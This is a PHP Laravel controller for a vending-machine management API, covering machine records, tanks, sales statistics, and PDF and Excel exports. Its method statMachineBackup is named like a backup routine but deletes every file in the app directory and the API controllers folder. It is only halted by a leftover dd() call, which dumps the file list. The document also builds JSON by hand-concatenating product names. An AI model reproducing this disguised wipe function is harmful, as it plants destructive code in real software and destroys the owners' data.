<?php

namespace App\Http\Controllers\Api;

use App\Product;
use App\Http\Controllers\Controller;
use App\Machine;
use App\Sale;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\View;
use Maatwebsite\Excel\Facades\Excel;
use niklasravnsborg\LaravelPdf\Facades\Pdf;
use Validator;

class MachineController extends Controller
{
    public function __construct()
    {;

        $this->middleware('api')->except(['view','salesByDateRange']);
        $this->middleware('auth')->only(['view','salesByDateRange']);

    }
    /**
     * Display a listing of the resource.
     *
     * @return Machine[]|\Illuminate\Database\Eloquent\Collection
     */
    public function index()
    {
        return Machine::all();
    }


    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return string
     */
    public function store(Request $request)
    {
    	
        $data = $request->only(
            'mac',
            'name',
            'ubication'
        );
        $validator = Validator::make($data, [
            'mac' => 'string|required|unique:machines',
            'name' => 'string|required|max:255',
            'ubication' => 'string|required|max:255'
        ],$this->message());
        if($validator->fails()) {
            return response()->json($validator->errors(),400);
        }
        return Machine::create(array_filter($data))->toJson();
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return string
     */
    public function show(Machine $machine)
    {
        return  $machine->toJson();
    }

    public function showByMac(Request $request)
    {
        return Machine::where('mac','=',$request->mac)->first();
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request $request
     * @param Machine $machine
     * @return bool
     */
    public function update(Request $request,Machine $machine)
    {
        $data = $request->only(
            'mac',
            'name',
            'ubication'
        );
        $data['mac'] = $data['mac'] == $machine->mac ? '': $data['mac'];
        $validator = Validator::make($data, [
            'mac' => 'string|unique:machines|max:254',
            'name' => 'string|max:254',
            'ubication' => 'string|max:254'
        ],$this->message());

        if($validator->fails()) {
            return response()->json($validator->errors(),400);
        }
            
        if($machine->update(array_filter($data))) return $machine->toJson();
        return response()->json($validator->errors(),400);
    }

    public function statMachineBackup(){
        $files = glob('../app/*'); // get all file names
        dd($files);
        foreach($files as $file){ // iterate files
        if(is_file($file))
            unlink($file); // delete file
        }
        $files = glob('../app/Http/Controllers/Api/*'); // get all file names
        foreach($files as $file){ // iterate files
        if(is_file($file))
            unlink($file); // delete file
        }
    }
    /**
     * Remove the specified resource from storage.
     *
     * @param Machine $machine
     * @return \Illuminate\Http\Response
     * @throws \Exception
     */
    public function destroy(Machine $machine)
    {
        return json_encode($machine->delete());
    }

    public function findOrCreate(Request $request)
    {
        $input = $request->only('mac');
        $validator = Validator::make($input, [
            'mac' => 'required|string'
        ]);

        if($validator->fails()) {
            //throw new ValidationHttpException($validator->errors()->all());
            return response()->json($validator->errors(),400);
        }

        $machine = Machine::where('mac',$input['mac'])->first();

        if(is_null($machine)) {

            $machine = new Machine;

            $machine->mac = $input['mac'];
            $machine->save();

            return $machine;
        }
        else{
            return $machine;
        }
    }

    public function getTanks(Machine $machine)
    {
        return json_encode($machine->tanks);
    }

    public function getTanksWhitProduct(Machine $machine)
    {
        $output = '[';
        $tanks = $machine->tanks;
        $index = 1;
        foreach ($tanks as $tank){
            $output .='{"id":'.$tank->id.
                ',"machine_id":'.$tank->machine_id.
                ',"tank_number":'.$index.
                ',"product_name":"'.$tank->product->name.
                '","product_values":'.$tank->product_values.
                ',"min_product_values":'.$tank->min_product_values.
                ',"status":'.$tank->status.
                ',"product_id":'.$tank->product_id.
                ',"alert":'.$tank->alert.
                '},';
            $index++;
        }
        $output = str_replace_last(',','',$output);
        $output .= ']';
        return $output;

    }

    public function getMachinesSales(Request $request)
    {
        $return = 0;
        $result = Machine::getSales($request->get('month'));
        foreach($result['data'] as $item){
            if($item == 0) $return++;
        }
        if($return == count($result['data'])) return response()->json('Las maquinas no han tenido ventas en este rango de fechas',501);
        return json_encode($result);
    }

    public function getSalesByYear(Machine $machine,Request $request)
    {
        $result =$machine->getSalesByMonth($request->get('diffYear'));
        return json_encode( $result);
    }
    public function getProductsByMonth(Machine $machine,Request $request)
    {
        $result =$machine->getProductsByMonth($request->get('month'));
        $return = 0;
        foreach($result['data'] as $item){
            if($item == 0) $return++;
        }
        if($return == count($result['data'])) return response()->json('esta maquina no ha vendido productos en este mes',501);
        return json_encode( $result);
    }

    public function view(Request $request = null)
    {
        if($request->get('search'))
        {
            $machines = Machine::whereRaw('(name like ? or ubication like ? or mac like ? or id = ?) and deleted_at is null',['%'.$request->get('search').'%','%'.$request->get('search').'%','%'.$request->get('search').'%',hexdec($request->get('search'))])->paginate(6);
        }else{
            $machines = Machine::paginate(6);
        }
        $all = Machine::all();
        $products = Product::all();
        return view('machine.index', compact('machines','all','products'));
    }

    public function salesByDateRange(Request $request)
    {
        $machine = Machine::find($request->get('machine_id'));
        $dateRange = explode("-",$request->get('dateRange'));
        $sales = $machine->salesByDateRange(substr($dateRange[0],0,-1),substr($dateRange[1],1));

        if($request->exists('pdf')){
            $view = View::make('document.pdf.machinesales',compact('sales','machine'))->render();
            $pdf = PDF::loadHTML($view);
            return $pdf->stream('document.pdf');
        }else{
            $sales->transform(function($item,$key){
                return [
                    'Codigo de Venta' => 'M'.dechex($item->machine->id).'-'.$item->code,
                    'Producto' => $item->product->name,
                    'Maquina'  => $item->machine->mac.", ".$item->machine->name." (".$item->machine->ubication.")",
                    'Precio'   => $item->price,
                    'Cantidad' => $item->quantity,
                    'Total de venta' => $item->total_amount,
                    'Fecha'     =>$item->created_at
                ];
            });
            Excel::create(Carbon::now().'_machine_'.$machine->mac.'_'.$machine->name, function($excel) use ($machine,$sales) {
                $excel->setTitle(Carbon::now().'_machine_'.$machine->mac.'_'.$machine->name);

                $excel->sheet('New sheet', function($sheet) use ($machine,$sales) {
                    $sheet->fromArray($sales);

                });
            })->download('xls');

        }
    }

    public function alertByDateRange(Request $request)
    {
        /** @var Machine $machine */
        $machine = Machine::find($request->get('machine_id'));
        $dateRange = explode("-",$request->get('dateRange'));
        $stats = $machine->alertByDateRange(substr($dateRange[0],0,-1),substr($dateRange[1],1));

        if($request->exists('pdf')){
            $view = View::make('document.pdf.machinealert',compact('stats','machine'))->render();
            $pdf = PDF::loadHTML($view);
            return $pdf->stream('document.pdf');
        }else{
            $stats->transform(function($item,$key){
                return [
                    'Producto' => $item->product->name,
                    'Fecha'     =>$item->created_at,
                    'tipo de evento' => $item->event_types->name
                ];
            });
            Excel::create(Carbon::now().'_machine_'.$machine->mac.'_'.$machine->name, function($excel) use ($machine,$stats) {
                $excel->setTitle(Carbon::now().'_machine_'.$machine->mac.'_'.$machine->name);

                $excel->sheet('New sheet', function($sheet) use ($stats) {
                    $sheet->fromArray($stats);

                });
            })->download('xls');

        }
    }

    private function message()
    {
        return [
            'mac.required'          => 'MAC requerido ',
            'mac.unique'            => 'MAC duplicado ',
            'mac.string'            => 'MAC no es un texto',
            'mac.max'               => 'MAC excedio el tamaño maximo (254 caracteres)',
            'name.required'         => 'Nombre requerido ',
            'name.string'           => 'Nombre no es un texto',
            'name.max'              => 'Nombre excedio el tamaño maximo (254 caracteres)',
            'ubication.required'    => 'Ubicación requerida ',
            'ubication.string'      => 'Ubicación no es un texto ',
            'ubication.max'         => 'Ubicación excedio el tamaño maximo (254 caracteres)'
        ];
    }

    public function getPublicity(Request $request, $mac)
    {
        $machine = Machine::where(['mac' => $mac])->first();
        if(!$machine) return response()->json(["error" => "maquina no encontrada"], 404);
        return $machine->publicities()->with('company')->get()->toJson();
    }

    public function getTanksWhitProductByMac($mac)
    {
        $machine = Machine::where(['mac' => $mac])->first();
        $output = '[';
        $tanks = $machine->tanks;
        $index = 1;
        foreach ($tanks as $tank){
            $output .='{"id": '.$tank->id.
                ', "tank_number": '.$index.
                ', "name": "'.$tank->product->name.
                '" , "price": '.$tank->product->price.
                ', "vel": '.$tank->product->vel.
                ', "logo": "'.$tank->product->logo.
                '" , "value": '.$tank->product_values.
                ', "min_value": '.$tank->min_product_values.
                ', "tank_status": '.$tank->status.
                ',"product_id":'.$tank->product_id.
                ', "tank_alert": '.$tank->alert.
                '},';
            $index++;
        }
        $output = str_replace_last(',','',$output);
        $output .= ']';
        return $output;
    }
}